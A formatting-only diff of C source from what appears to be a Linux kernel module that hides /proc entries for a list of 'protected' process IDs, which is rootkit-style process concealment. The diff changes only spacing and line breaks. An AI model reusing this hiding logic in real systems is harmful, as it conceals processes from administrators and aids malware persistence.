@@ -16,23 +16,20 @@ struct protect_status {
 
 bool is_path_protected(struct path *p) {
   pid_t    ppid = 0;
-  uint64_t i      = 0;
+  uint64_t i    = 0;
 
-  if(NULL == p->dentry || 
-     NULL == p->dentry->d_name.name)
+  if (NULL == p->dentry || NULL == p->dentry->d_name.name)
     return false;
 
   // attempt convert the name to a pid
   if (kstrtos32(p->dentry->d_name.name, 10, &ppid) != 0)
     return false;
 
-  if(NULL == p->mnt->mnt_sb ||
-     NULL == p->mnt->mnt_sb->s_type ||
-     NULL == p->mnt->mnt_sb->s_type->name)
+  if (NULL == p->mnt->mnt_sb || NULL == p->mnt->mnt_sb->s_type || NULL == p->mnt->mnt_sb->s_type->name)
     return false;
 
   // only hide procfs entries
-  if(strcmp(p->mnt->mnt_sb->s_type->name, "proc") != 0)
+  if (strcmp(p->mnt->mnt_sb->s_type->name, "proc") != 0)
     return false;
 
   for (; i < pst.count; i++)
@@ -68,7 +65,7 @@ bool __cmd_protect_is_parent_protected(pid_t pid) {
 bool is_process_protected(pid_t pid) {
   uint64_t i = 0;
 
-  if(NULL == pst.list)
+  if (NULL == pst.list)
     return false;
 
   for (; i < pst.count; i++) {
@@ -136,13 +133,13 @@ bool is_inode_protected(uint64_t inode) {
   return false;
 }
 
-bool protect_pid(pid_t pid){
+bool protect_pid(pid_t pid) {
   if (NULL == pst.list)
     pst.list = (void *)kmalloc(++pst.count * sizeof(pid_t), GFP_KERNEL);
   else
     pst.list = (void *)krealloc(pst.list, ++pst.count * sizeof(pid_t), GFP_KERNEL);
 
-  pst.list[pst.count-1] = pid;
+  pst.list[pst.count - 1] = pid;
   debgf("protecting PID: %d", pst.list[pst.count - 1]);
 
   return true;
